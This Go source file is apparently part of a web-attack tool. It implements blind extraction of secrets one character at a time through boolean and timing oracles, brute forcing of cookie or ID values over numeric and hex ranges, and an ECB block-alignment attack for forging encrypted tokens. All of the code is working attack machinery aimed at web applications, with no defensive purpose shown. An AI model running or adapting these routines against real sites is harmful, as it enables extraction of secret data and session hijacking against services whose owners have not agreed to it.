package main

import (
	"encoding/hex"
	"net/http"
	"strconv"
	"strings"
	"time"
)

type BruteForceString struct {
	SetDataGrabber
	Field, Prefix, Suffix, First, Wildcard string
}

func (s BruteForceString) Grab(r http.Request) string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
	var result, knownChars string

	for _, c := range chars {
		s.SetDataGrabber.SetKey(s.Field, Text{s.Prefix + s.Wildcard + string(c) + s.Wildcard + s.Suffix})
		if s.SetDataGrabber.Grab(r) == "1" {
			knownChars += string(c)
		}
	}
Loop:
	for {
		for _, c := range knownChars {
			s.SetDataGrabber.SetKey(s.Field, Text{s.Prefix + s.First + result + string(c) + s.Wildcard + s.Suffix})
			if s.SetDataGrabber.Grab(r) == "1" {
				result += string(c)
				continue Loop
			}
		}
		return result
	}
}

type NotContain struct {
	Grabber
	NotMatch string
}

func (n NotContain) Grab(r http.Request) string {
	if !strings.Contains(n.Grabber.Grab(r), n.NotMatch) {
		return "1"
	}
	return "0"
}

type Contains struct {
	Grabber
	Match string
}

func (c Contains) Grab(r http.Request) string {
	if strings.Contains(c.Grabber.Grab(r), c.Match) {
		return "1"
	}
	return "0"
}

type TakesTime struct {
	Grabber
	time.Duration
}

func (t TakesTime) Grab(r http.Request) string {
	start := time.Now()
	t.Grabber.Grab(r)
	if time.Now().Sub(start) > t.Duration {
		return "1"
	}
	return "0"
}

type BruteForceRange struct {
	SetDataGrabber
	Range
	Field, Prefix, Suffix string
}

func (b BruteForceRange) Grab(r http.Request) string {
	for b.Range.Next() {
		idStr := b.Range.ID()
		b.SetDataGrabber.SetKey(b.Field, Text{b.Prefix + idStr + b.Suffix})
		if b.SetDataGrabber.Grab(r) == "1" {
			return idStr
		}
	}
	panic("no cookie found")
}

type Range interface {
	Next() bool
	ID() string
}

type NumRange struct {
	Start, End int
}

func (r *NumRange) Next() bool {
	r.Start++
	return r.Start <= r.End
}

func (r *NumRange) ID() string {
	return strconv.Itoa(r.Start)
}

type RangeList []Range

func (r *RangeList) Next() bool {
	if len(*r) > 0 {
		if !(*r)[0].Next() {
			*r = (*r)[1:]
			return len(*r) > 0
		}
		return true
	}
	return false
}

func (r *RangeList) ID() string {
	return (*r)[0].ID()
}

type RangeSuffix struct {
	Range
	Suffix string
}

func (r RangeSuffix) ID() string {
	return r.Range.ID() + r.Suffix
}

type RangeHex struct {
	Range
}

func (r RangeHex) ID() string {
	return hex.EncodeToString([]byte(r.Range.ID()))
}

type ECBBreaker struct {
	Encrypter interface {
		Grabber
		SetKey(string, Grabber)
	}
	EncrypterField string
	PlainText      string
}

func (e ECBBreaker) Grab(r http.Request) string {
	e.Encrypter.SetKey(e.EncrypterField, Text{""})
	initialLength := len(e.Encrypter.Grab(r))
	i := 1
	firstChange := -1
	secondChange := -1
	for {
		e.Encrypter.SetKey(e.EncrypterField, Text{strings.Repeat("A", i)})
		l := len(e.Encrypter.Grab(r))
		if l != initialLength {
			if firstChange == -1 {
				initialLength = l
				firstChange = l
			} else {
				secondChange = l
				break
			}
		}
		i++
	}

	blockSize := secondChange - firstChange

	var offset, blockStart int
	str := strings.Repeat("B", blockSize-1) + strings.Repeat("A", blockSize*2)

Loop:
	for i := 0; i < 16; i++ {
		e.Encrypter.SetKey(e.EncrypterField, Text{str[15-i:]})
		str := e.Encrypter.Grab(r)
		last := ""
		for j := 0; j < len(str); j += blockSize {
			this := str[j : j+blockSize]
			if this == last {
				blockStart = (j / 16) - 1
				offset = i
				break Loop
			}
			last = this
		}
	}

	e.Encrypter.SetKey(e.EncrypterField, Text{strings.Repeat("B", offset) + e.PlainText})
	enc := e.Encrypter.Grab(r)

	return enc[blockStart*blockSize:]
}
